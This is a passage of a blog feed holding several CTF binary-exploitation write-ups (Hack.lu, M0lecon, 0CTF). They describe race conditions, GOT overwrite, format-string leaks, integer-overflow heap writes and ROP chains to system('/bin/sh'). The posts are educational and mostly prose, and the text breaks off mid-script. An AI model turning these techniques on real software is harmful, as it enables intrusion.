</code></pre></div></div> <p>And I wrote a python script to run this program 1000 times and collect the offset values. And after analyzing the offset values, it turns out that there’s only 5 bits that are actually random in these offset values.</p> <p>Now, what’s more fascinating is that the stack of this <code class="language-plaintext highlighter-rouge">pthread</code> is also contiguous with the <code class="language-plaintext highlighter-rouge">libc</code> base. Which basically means that if you have leaks of the heap in a <code class="language-plaintext highlighter-rouge">pthread</code>, you can predict addresses of its stack and <code class="language-plaintext highlighter-rouge">libc</code> within 32 attempts!!!</p> <pre>
<span style="color:#ccc;">●→</span> <span style="color:#ffcc00;">0x5555555553ad</span> <span style="color:#ffffff;">&lt;thread_func+0000&gt;</span> <span style="color:#8be9fd;font-weight:bold;">endbr64</span>
  <span style="color:#ffcc00;">0x5555555553b1</span> <span style="color:#ffffff;">&lt;thread_func+0004&gt;</span> <span style="color:#8be9fd;font-weight:bold;">push</span>   <span style="color:#ffffff;">rbp</span>
  <span style="color:#ffcc00;">0x5555555553b2</span> <span style="color:#ffffff;">&lt;thread_func+0005&gt;</span> <span style="color:#8be9fd;font-weight:bold;">mov</span>    <span style="color:#ffffff;">rbp</span>, <span style="color:#ffffff;">rsp</span>

<span style="color:cyan;">gef➤</span>  <span style="color:lightgreen;">vmmap $rsp</span>
<span style="color:#999;">[ Legend:  Code | Heap | Stack ]</span>
<span style="color:#ffcc00;">Start</span>              <span style="color:#ffcc00;">End</span>                <span style="color:#ffcc00;">Offset</span>             <span style="color:#ff79c6;">Perm</span> <span style="color:#cccccc;">Path</span>
<span style="color:#f1fa8c;">0x00007ffff7400000</span> <span style="color:#f1fa8c;">0x00007ffff7c00000</span> <span style="color:#f1fa8c;">0x0000000000000000</span> <span style="color:#ff79c6;">rw-</span>                <span style="color:#aaaaaa;">&lt;----------- THREAD STACK</span>

<span style="color:cyan;">gef➤</span>  <span style="color:lightgreen;">vmmap</span>
<span style="color:#999;">[ Legend:  Code | Heap | Stack ]</span>
<span style="color:#ffcc00;">Start</span>              <span style="color:#ffcc00;">End</span>                <span style="color:#ffcc00;">Offset</span>             <span style="color:#ff79c6;">Perm</span> <span style="color:#cccccc;">Path</span>
<span style="color:#999;">...</span>
<span style="color:#f1fa8c;">0x0000555555559000</span> <span style="color:#f1fa8c;">0x000055555557a000</span> <span style="color:#f1fa8c;">0x0000000000000000</span> <span style="color:#ff79c6;">rw-</span> <span style="color:#cccccc;">[heap]</span>         <span style="color:#aaaaaa;">&lt;----------- MAIN HEAP</span>
<span style="color:#f1fa8c;">0x00007ffff0000000</span> <span style="color:#f1fa8c;">0x00007ffff0021000</span> <span style="color:#f1fa8c;">0x0000000000000000</span> <span style="color:#ff79c6;">rw-</span>                <span style="color:#aaaaaa;">&lt;----------- THREAD HEAP</span>
<span style="color:#999;">...</span>
<span style="color:#f1fa8c;">0x00007ffff73ff000</span> <span style="color:#f1fa8c;">0x00007ffff7400000</span> <span style="color:#f1fa8c;">0x0000000000000000</span> <span style="color:#ff79c6;">---</span> 
<span style="color:#f1fa8c;">0x00007ffff7400000</span> <span style="color:#f1fa8c;">0x00007ffff7c00000</span> <span style="color:#f1fa8c;">0x0000000000000000</span> <span style="color:#ff79c6;">rw-</span>                <span style="color:#aaaaaa;">&lt;----------- THREAD STACK</span>
<span style="color:#f1fa8c;">0x00007ffff7c00000</span> <span style="color:#f1fa8c;">0x00007ffff7c28000</span> <span style="color:#f1fa8c;">0x0000000000000000</span> <span style="color:#50fa7b;">r--</span> <span style="color:#cccccc;">/usr/lib/x86_64-linux-gnu/libc.so.6</span>
</pre> <p>Here’s the probabilities for each bit in the offset from <code class="language-plaintext highlighter-rouge">pthread</code> heap base to stack base plotted.</p> <p><img src="/assets/img/hack.lu/Predict.png" alt="Predict.png"/></p> <p>And if you would like to run the same experiment, the files for it are available <a href="/assets/binary/hack.lu/predict.zip">here</a></p>]]></content><author><name></name></author><category term="writeup"/><category term="ctf"/><category term="heap"/><category term="pwn"/><summary type="html"><![CDATA[Solving the UPPACKNING challenge from Hack.lu CTF 2025]]></summary></entry><entry><title type="html">M0lecon CTF Teaser 2024 ducts Writeup</title><link href="https://jkrshnmenon.github.io/blog/2024/m0lectf24ducts/" rel="alternate" type="text/html" title="M0lecon CTF Teaser 2024 ducts Writeup"/><published>2024-09-14T15:09:00+00:00</published><updated>2024-09-14T15:09:00+00:00</updated><id>https://jkrshnmenon.github.io/blog/2024/m0lectf24ducts</id><content type="html" xml:base="https://jkrshnmenon.github.io/blog/2024/m0lectf24ducts/"><![CDATA[<p>This CTF was the kickoff of Shellphish Academy.</p> <p>Now Shellphish Academy is a lot like DEFCON Academy (which @Zardus explains with such grace in this DEFCON talk). So for this CTF, we had a good number of blue-belt hackers from pwn.college play with Shellphish.</p> <p>It was a fun experience, and I got to meet a bunch of super awesome hackers in the process too.</p> <p>This challenge was pretty fun as well. So lets get into it.</p> <h2 id="step-1-reversing">Step 1: Reversing</h2> <p>The binary forks off a process to act as the <code class="language-plaintext highlighter-rouge">backend</code> process. This <code class="language-plaintext highlighter-rouge">backend</code> process reads input from a pipe and then performs either of two operations based on the type of input.</p> <p>If the input is a message, it is stored into a linked list of messages. Nothing else happens when the <code class="language-plaintext highlighter-rouge">backend</code> receives a message except for writing the content of the message to <code class="language-plaintext highlighter-rouge">/dev/null</code> which is probably not relevant to the solution at all.</p> <p>The other part of <code class="language-plaintext highlighter-rouge">backend</code> is the command handling. And this command handler is the interesting part. There’s three commands that can be sent</p> <ul> <li>Flush messages</li> <li>Print messages</li> <li>Redact message</li> </ul> <p>The first two are pretty self-explanatory. The only extra detail is that <code class="language-plaintext highlighter-rouge">print_messages</code> also prints out some pointers which will be useful for a leak.</p> <p>The <code class="language-plaintext highlighter-rouge">redact_message</code> uses an index specified in the command to walk the linked-list and identify the correct message. It then uses an 8-byte value specified in the command to overwrite the content of the message.</p> <p>This is the structure of the command and message that I identified.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="k">struct</span> <span class="p">{</span>
<span class="kt">int</span> <span class="n">type</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
<span class="n">message</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mh">0x40</span><span class="p">];</span>
<span class="kt">char</span> <span class="n">content</span><span class="p">[];</span>
<span class="p">}</span> <span class="n">message</span><span class="p">;</span>

<span class="k">struct</span> <span class="p">{</span>
<span class="kt">int</span> <span class="n">type</span><span class="p">;</span>
<span class="kt">int</span> <span class="n">cmd</span><span class="p">;</span>
<span class="kt">long</span> <span class="n">idx</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">content</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
<span class="p">}</span> <span class="n">command</span><span class="p">;</span></code></pre></figure> <p>The <code class="language-plaintext highlighter-rouge">backend</code> process is only half of the whole binary. The other half is the “frontend” which is a fork-server.</p> <p>The binary spins up a new fork to handle incoming connections to a specific port. This process then uses the <code class="language-plaintext highlighter-rouge">talk</code> function to read messages from the user.</p> <p>These messages are then sent over the pipe to the <code class="language-plaintext highlighter-rouge">backend</code> after which the process exits.</p> <h2 id="step-2-the-bug">Step 2: The Bug</h2> <p>I spent a few minutes trying to see if there was a buffer overflow in the <code class="language-plaintext highlighter-rouge">talk</code> function. Initially it seemed like the input reading loop only terminated on newlines. I soon found that after the buffer limit was reached, the program would go into an infinite loop. No dice.</p> <p>The other alternative was a race-condition since we could spawn multiple threads at the same time. However, the frontend was sending data to the <code class="language-plaintext highlighter-rouge">backend</code> using a <code class="language-plaintext highlighter-rouge">write</code> function call.</p> <p>To the best of my limited kernel knowledge, the <code class="language-plaintext highlighter-rouge">write</code> function is atomic. And after consulting with @kylebot and @zolutal, I was assured that this was the case.</p> <p>But the size of the buffer that the <code class="language-plaintext highlighter-rouge">talk</code> function used was absolutely massive (0x27100)! And after some trial and error, I found that inputs of the size 0x20000 are not written atomically. Which meant that we could cause some mischief.</p> <p>I wrote up a script that created two connections to the port and sent two giant buffers at the same time. And I saw some output that confirmed that the two giant buffers were getting spliced together. Which meant that we could possibly put a fake command into a message content and have the <code class="language-plaintext highlighter-rouge">backend</code> perform our command.</p> <p>The <code class="language-plaintext highlighter-rouge">backend</code> function would read 4 bytes from the pipe and check if the value read was 0 or 1. If the value read was neither, it would just read the next 4 bytes. This meant that even if the message was not split exactly at the fake chunk, it would be fine since the bytes before the fake chunk would simply be read and discarded.</p> <p>I decided to put my fake chunks in the last page of the giant message to give it the highest probability of triggering the race-condition.</p> <h2 id="step-3-the-exploit">Step 3: The Exploit</h2> <p>So with the race-condition, I was able to get a bunch of fake commands executed by the <code class="language-plaintext highlighter-rouge">backend</code>. This gave me PIE leak and a LIBC leak that worked 6/10 times.</p> <p>But for the actual exploit, I confirmed with @x3ero0 that the <code class="language-plaintext highlighter-rouge">redact_message</code> was our target. Recall that with the <code class="language-plaintext highlighter-rouge">redact_message</code> function, we could overwrite 8 bytes of the content of a specific message in the linked-list with a value that we control. Combined with the fact that we can craft arbitrary messages, we basically have memory leaks and an 8-byte arbitrary overwrite.</p> <p>In order to do this, I created a fake message that contained an arbitrary <code class="language-plaintext highlighter-rouge">next</code> pointer. The next question was to identify a target to overwrite and a value to overwrite it with.</p> <p>The binary only had partial RELRO and we could overwrite some of the GOT table pointers. However, the <code class="language-plaintext highlighter-rouge">redact_message</code> would write the value 1 into the message type before overwriting the content. So we had to choose an address <code class="language-plaintext highlighter-rouge">X</code> such that <code class="language-plaintext highlighter-rouge">X-0x50</code> was writable and <code class="language-plaintext highlighter-rouge">X</code> was a GOT function that would be called with controlled input.</p> <p>I found that <code class="language-plaintext highlighter-rouge">fwrite</code> was a good candidate that met these requirements. It was only called when a message was received and only used to write the content of the message into <code class="language-plaintext highlighter-rouge">/dev/null</code>.</p> <p>Eventually I got all my offsets proper and got the shell locally. And since ASU network was interfering with my connection to the challenge server, I had @ElChals run the script and get the flag.</p> <p>The final exploit is available here: <a href="/assets/python/ducts/exploit.py">Exploit</a></p>]]></content><author><name></name></author><category term="writeup"/><category term="ctf"/><category term="race-condition"/><category term="overflow"/><summary type="html"><![CDATA[Solving the ducts challenge from M0lecon Teaser 2023]]></summary></entry><entry><title type="html">M0lecon CTF 2023 NoRegVM Writeup</title><link href="https://jkrshnmenon.github.io/blog/2023/m0lectf23noregvm/" rel="alternate" type="text/html" title="M0lecon CTF 2023 NoRegVM Writeup"/><published>2023-05-17T15:09:00+00:00</published><updated>2023-05-17T15:09:00+00:00</updated><id>https://jkrshnmenon.github.io/blog/2023/m0lectf23noregvm</id><content type="html" xml:base="https://jkrshnmenon.github.io/blog/2023/m0lectf23noregvm/"><![CDATA[<p>For some reason, I’ve found VM exploitation challenges to be quite interesting recently.</p> <p>I managed to solve a challenge called NoRegVM from M0lecon CTF 2023. I also tried to solve a reversing challenge involving the same binary, but I couldn’t find the final solution. But that’s for another blog post.</p> <h2 id="step-1-reversing">Step 1: Reversing</h2> <p>This program lets you provide the code and memory that a VM is initialized with.</p> <p>The VM can perform 13 different functions including reading and writing to the standard input/output.</p> <p>This VM does not use registers, so all the operands used for an operation should be immediate values or memory addresses. Data can be copied to and from the memory using the <code class="language-plaintext highlighter-rouge">pop_in</code> and <code class="language-plaintext highlighter-rouge">pop_out</code> instructions in the VM.</p> <h2 id="step-2-the-bugs">Step 2: The Bug(s)</h2> <p>I found three bugs in this challenge and I eventually used all of them for the final exploit.</p> <p>The first bug is a buffer overflow vulnerability in the <code class="language-plaintext highlighter-rouge">pop_out</code> function.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/noregvm/popout-480.webp 480w,/assets/img/noregvm/popout-800.webp 800w,/assets/img/noregvm/popout-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/noregvm/popout.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The loop in <code class="language-plaintext highlighter-rouge">pop_out</code> can be executed as many times as we want. This would eventually lead to an out-of-bounds write of the <code class="language-plaintext highlighter-rouge">output</code> buffer.</p> <p>And that leads us to the second bug which is a format string vulnerability in the <code class="language-plaintext highlighter-rouge">write_buf</code> function.</p> <p>Looking at the pseudo-code generated by IDA, this vulnerability is not apparent.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/noregvm/pseudocode-480.webp 480w,/assets/img/noregvm/pseudocode-800.webp 800w,/assets/img/noregvm/pseudocode-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/noregvm/pseudocode.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>However, if you look at the actual assembly code, we see that the format specifier used by <code class="language-plaintext highlighter-rouge">printf</code> is a buffer in the data section of the binary.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/noregvm/assembly-480.webp 480w,/assets/img/noregvm/assembly-800.webp 800w,/assets/img/noregvm/assembly-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/noregvm/assembly.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>And it so happens that this <code class="language-plaintext highlighter-rouge">FMT_STR</code> buffer lies just after the <code class="language-plaintext highlighter-rouge">output</code> buffer.</p> <p>Therefore, by overflowing the <code class="language-plaintext highlighter-rouge">output</code> buffer using the <code class="language-plaintext highlighter-rouge">pop_out</code> function, we can trigger a format string vulnerability in the <code class="language-plaintext highlighter-rouge">write_buf</code> function. This can be used to leak whatever data we need.</p> <p>I ended up leaking the heap, canary, stack, binary and libc base addresses.</p> <p>The final bug is in the <code class="language-plaintext highlighter-rouge">len</code> function.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/noregvm/len-480.webp 480w,/assets/img/noregvm/len-800.webp 800w,/assets/img/noregvm/len-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/noregvm/len.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>In this function again, we can execute the loop as many times as we want. This eventually leads to an out-of-bounds write of the stack buffer of size 200;</p> <h2 id="step-3-the-exploit">Step 3: The Exploit</h2> <p>So the plan was clear,</p> <ul> <li>Overflow `output` buffer to overwrite `FMT_STR`</li> <li>Leak all the pointers</li> <li>Overflow stack buffer in `len` and get PC control</li> <li>????</li> <li>Profit</li> </ul> <p>A slightly annoying part about this challenge is that the loop in the <code class="language-plaintext highlighter-rouge">len</code> function will stop at the first instance of an int value 0. However, only the lower 8 bits from each memory address is copied into the stack buffer. Therefore, if the value at a memory address was 0x0100, the check for 0 would pass while only the last byte (i.e NULL) would be appended to the stack buffer.</p> <p>In order to do this, I modified the program code to generate this 0x100 value (by performing 0x10 * 0x10) and writing it to the indices where I needed NULL bytes.</p> <p>The final exploit uses the leaks in a simple ROP chain to call <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code></p> <p>I had initially written this exploit by hard-coding the opcodes and operand values. And it was very hard to read for someone who didn’t understand my plan.</p> <p>So, after the CTF, I tried re-writing the exploit to use my assembler. And it worked with minimal adjustments! Even I was surprised.</p> <p>The final exploit is available here: <a href="/assets/python/noregvm/exploit.py">Exploit</a></p> <p>And since the assembler will keep getting updated, its better to store it somewhere like <a href="https://github.com/jkrshnmenon/scripts/blob/master/assembler_stuff/assembler.py">GitHub</a>.</p>]]></content><author><name></name></author><category term="writeup"/><category term="stack"/><category term="ctf"/><summary type="html"><![CDATA[Solving the NoRegVM challenge from M0lecon CTF 2023]]></summary></entry><entry><title type="html">OCTF 2022 EZVM Writeup</title><link href="https://jkrshnmenon.github.io/blog/2023/0ctf22ezvm/" rel="alternate" type="text/html" title="OCTF 2022 EZVM Writeup"/><published>2023-01-05T15:09:00+00:00</published><updated>2023-01-05T15:09:00+00:00</updated><id>https://jkrshnmenon.github.io/blog/2023/0ctf22ezvm</id><content type="html" xml:base="https://jkrshnmenon.github.io/blog/2023/0ctf22ezvm/"><![CDATA[<p>Its been some time since I wrote one of these, so I might be a little rusty. Do bear with me.</p> <p>I wasn’t able to play 0CTF 2022 in full while it was going on but I was helping one of my teammates (@zolutal) who was trying to solve this challenge. I had briefly tried to reverse engineer the binary but didn’t have enough time to analyze it completely.</p> <h2 id="step-1-reversing">Step 1: Reversing</h2> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/main-480.webp 480w,/assets/img/ezvm/main-800.webp 800w,/assets/img/ezvm/main-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/main.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The main function doesn’t do much except for that 256 byte long buffer which I thought might be useful in case we needed to fill some constraints for a one-gadget. But I did not end up using that approach.</p> <p>The <code class="language-plaintext highlighter-rouge">do_main</code> function does more interesting stuff by comparison</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/do_main-480.webp 480w,/assets/img/ezvm/do_main-800.webp 800w,/assets/img/ezvm/do_main-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/do_main.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>During my hasty reverse engineering process, I ended up naming the allocation at line 24 as <code class="language-plaintext highlighter-rouge">registers</code> even though the program was basically telling me it was called <code class="language-plaintext highlighter-rouge">memory</code>. So for the rest of this blog, I’ll refer to this allocated region as <code class="language-plaintext highlighter-rouge">memory</code> even though my decompiled code says <code class="language-plaintext highlighter-rouge">registers</code>.</p> <p>The comparison at line 17 stands out pretty well as a possible location for a bug, but I was more interested in reversing the other functions.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/init_vm-480.webp 480w,/assets/img/ezvm/init_vm-800.webp 800w,/assets/img/ezvm/init_vm-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/init_vm.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Init VM clears all of the data before executing the code. However, since it uses <code class="language-plaintext highlighter-rouge">malloc</code>, some of the data on the heap might still be present and available for reuse.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/run_vm-480.webp 480w,/assets/img/ezvm/run_vm-800.webp 800w,/assets/img/ezvm/run_vm-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/run_vm.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>And now we get to the actual VM part.</p> <p>There’s quite a lot of switch cases here. Each instruction is apparently one byte and the VM follows a stack based model. Which means that for an arithmetic operation, two values on the top of the stack are popped off and the result is pushed back on to the stack.</p> <p>The program does make sure that the stack does not overflow or underflow.</p> <p>Line 27 in the above screenshot looked a bit weird to me since it checks if <code class="language-plaintext highlighter-rouge">operand1</code> is lesser than 4 and then adds 4 to it while dereferencing.</p> <p>However, looking at the memory layout, it makes more sense.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/memory-480.webp 480w,/assets/img/ezvm/memory-800.webp 800w,/assets/img/ezvm/memory-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/memory.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>Like I had mentioned earlier, the <code class="language-plaintext highlighter-rouge">regs</code> variable that I had named is actually supposed to be called <code class="language-plaintext highlighter-rouge">memory</code>.</p> <p>The VM maintains its own 4 registers each of which is 8 bytes long. These registers are referred to in the decompiled code as <code class="language-plaintext highlighter-rouge">internal_array</code>. And so we have</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="o">&amp;</span><span class="n">regs</span><span class="p">[</span><span class="mi">4</span><span class="o">+</span><span class="n">x</span><span class="p">]</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">internal_array</span><span class="p">[</span><span class="n">x</span><span class="p">]</span></code></pre></figure> <p>This makes the reverse engineering much more understandable.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/jump-480.webp 480w,/assets/img/ezvm/jump-800.webp 800w,/assets/img/ezvm/jump-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/jump.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>The VM even supports jump instructions. Although it does make sure that the program counter does not go beyond the bounds of the code section.</p> <h2 id="step-2-the-bug">Step 2: The Bug</h2> <p>I wasn’t able to find the bug here, but @zolutal found it.</p> <p>There are two bugs here that combine together to provide an arbitrary 8-byte write.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/vuln-480.webp 480w,/assets/img/ezvm/vuln-800.webp 800w,/assets/img/ezvm/vuln-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/vuln.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>In line 156, the variable <code class="language-plaintext highlighter-rouge">op2_</code> is an 8 byte value that we can control. So if it is large enough, it can index memory outside the chunk allocated in the <code class="language-plaintext highlighter-rouge">regs</code> variable.</p> <p>However, in order to do that, it must first pass the check at line 154.</p> <p>This is where the second bug comes in.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/do_main_vuln-480.webp 480w,/assets/img/ezvm/do_main_vuln-800.webp 800w,/assets/img/ezvm/do_main_vuln-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/do_main_vuln.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>These lines inside the <code class="language-plaintext highlighter-rouge">do_main</code> function allow us to set the <code class="language-plaintext highlighter-rouge">regs_size</code> variable in the <code class="language-plaintext highlighter-rouge">run_vm</code> function to any value up to 0x2000000000000000 (or 1 « 61 )</p> <p>However, when the allocation happens at the <code class="language-plaintext highlighter-rouge">malloc</code>, this value is multiplied with 8.</p> <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">In</span> <span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="nf">hex</span><span class="p">(((</span><span class="mh">0x2000000000000000</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">64</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span>
<span class="n">Out</span><span class="p">[</span><span class="mi">6</span><span class="p">]:</span> <span class="sh">'</span><span class="s">0x80</span><span class="sh">'</span></code></pre></figure> <p>Therefore, when we request an allocation of size 0x2000000000000000 + 0x10, the multiplication overflows into a value 0x80 which is the size of the buffer that <code class="language-plaintext highlighter-rouge">malloc</code> allocates.</p> <p>Now, in <code class="language-plaintext highlighter-rouge">run_vm</code>, the <code class="language-plaintext highlighter-rouge">regs_size</code> is 0x2000000000000000 + 0x10 which allows us to write to memory out of the bounds of the <code class="language-plaintext highlighter-rouge">regs</code> buffer.</p> <p>However, in the switch case number 22 in <code class="language-plaintext highlighter-rouge">run_vm</code>, we cannot use this idea to get an arbitrary read. This is because the comparison in line 162 will first multiply the <code class="language-plaintext highlighter-rouge">regs_size</code> by 8 and then divide the result by 8.</p> <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">In</span> <span class="p">[</span><span class="mi">10</span><span class="p">]:</span> <span class="nf">hex</span><span class="p">((((</span><span class="mh">0x2000000000000000</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">2</span><span class="o">**</span><span class="mi">64</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span><span class="o">//</span> <span class="mi">8</span><span class="p">)</span>
<span class="n">Out</span><span class="p">[</span><span class="mi">10</span><span class="p">]:</span> <span class="sh">'</span><span class="s">0x10</span><span class="sh">'</span></code></pre></figure> <p>This means that we cannot use this functionality to get an arbitrary read.</p> <h2 id="step-3-the-exploit">Step 3: The Exploit</h2> <p>Up until now, the only primitives we had was an arbitrary write. Moreover, we can only trigger this arbitrary overwrite in a single VM after which we cannot reuse it again.</p> <p>With some heap massaging, we can free tcache and smallbin chunks which leave some useful pointers on the heap. But since the VM does not write any content out, we were not able to figure out a way to leak these pointers.</p> <p>One of the ideas that I had was to perform some heap fengshui to position the code buffer after the memory buffer. If we could do that, we could use the arbitrary overwrite to overwrite some values in the code with the pointers that were on the heap. This would’ve been a crazy solution, but it eventually did not work out.</p> <p>And we actually did not solve this challenge during the CTF.</p> <h2 id="step-4-yansquad">Step 4: Yansquad</h2> <p>I forgot about this challenge after some time. But then it showed up in one of the classes that I’m taking here at ASU.</p> <p>CSE 598 Topic: Emerging Cybersecurity Techniques taken by none other than @zardus involved us playing CTF’s and solving challenges together in class.</p> <p>In this class, every week, one student is responsible for picking a challenge from a CTF, deconstructing to its most basic concept and creating a simplified version of the challenge. This one week, it was @clasm’s turn to present a challenge and he chose this one.</p> <p>The simplified version of the challenge provided all the primitives you could ask for in a heap exploitation challenge. And the objective was to learn how to overwrite the <code class="language-plaintext highlighter-rouge">tls_dtors_list</code> to get PC control.</p> <p><del>I’ll put up the files for this challenge as soon as @clasm lets me know its okay to.</del> The files for this simplified challenge are available <a href="/assets/binary/ezvm/simplified.zip">here</a>.</p> <p>But once I had solved the simplified one, I wanted to give another go at the original challenge.</p> <h2 id="step-5-the-leak">Step 5: The Leak</h2> <p>This time I noticed something that I had missed. A sidechannel for leaking pointers.</p> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ezvm/side_channel-480.webp 480w,/assets/img/ezvm/side_channel-800.webp 800w,/assets/img/ezvm/side_channel-1400.webp 1400w," sizes="95vw" type="image/webp"/> <img src="/assets/img/ezvm/side_channel.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <p>This switch case (which I called the <code class="language-plaintext highlighter-rouge">nop</code> case) would print a string “what??” when hit.</p> <p>Now, if I can write the code for the VM to perform some checks on the pointers and jump to a <code class="language-plaintext highlighter-rouge">nop</code> instruction if true, I will be able to leak pointers.</p> <h2 id="step-6-the-assembly">Step 6: The Assembly</h2> <p>I really did not want to write bytecode and deal with jump offsets (although maybe it would’ve been faster).</p> <p>So I ended up writing an assembler for this VM that supports labels and loops. It would replace labels with a <code class="language-plaintext highlighter-rouge">nop</code> instruction.</p> <figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="n">assembler</span> <span class="kn">import</span> \<span class="o">*</span>

<span class="k">def</span> <span class="nf">run_vm</span><span class="p">(</span><span class="n">prog</span><span class="p">,</span> <span class="n">mem_count</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
<span class="n">assembler</span> <span class="o">=</span> <span class="nc">Assembler</span><span class="p">(</span><span class="n">prog</span><span class="p">)</span>
<span class="n">code</span> <span class="o">=</span> <span class="n">assembler</span><span class="p">.</span><span class="nf">assemble</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="nf">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="s">Please input your code size:</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">"</span><span class="s">%d</span><span class="sh">"</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">code</span><span class="p">))</span>
